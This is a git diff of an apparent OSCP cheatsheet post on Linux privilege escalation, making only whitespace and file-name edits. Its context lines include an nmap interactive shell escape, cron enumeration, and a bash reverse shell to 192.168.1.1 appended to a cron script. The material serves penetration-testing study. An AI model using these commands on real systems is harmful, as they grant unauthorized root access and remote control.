@@ -1,6 +1,6 @@
 ---
 title: Linux Privilege Escalation
-author: sKyW1per 
+author: sKyW1per
 category: "OSCP"
 date: "2021-03-23 00:01"
 tags: [OSCP, Cheatsheet]
@@ -44,7 +44,6 @@ $ sudo nmap --interactive
 $ nmap> !bash
 ```
 
-
 ###### crontabs
 ```
 enumerating crontab:
@@ -52,7 +51,7 @@ $ ls -al /etc/cron* /etc/at*
 $ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/> dev/null | grep -v "^#"
 
 Add a line to a file:
-$ echo "/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1" >> cleanup.sh
+$ echo "/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1" >> script.sh
 ```
 
 ###### Writable /etc/passwd or /etc/shadow
@@ -79,6 +78,7 @@ https://gtfobins.github.io/
 ###### Compiling C Exploits
 ```
 $ gcc exploit.c -o exploit
+
 Installing gcc libraries for cross compiling
 $ sudo apt-get install gcc-multilib
 $ gcc -m32 -Wall exploit.c -o exploit
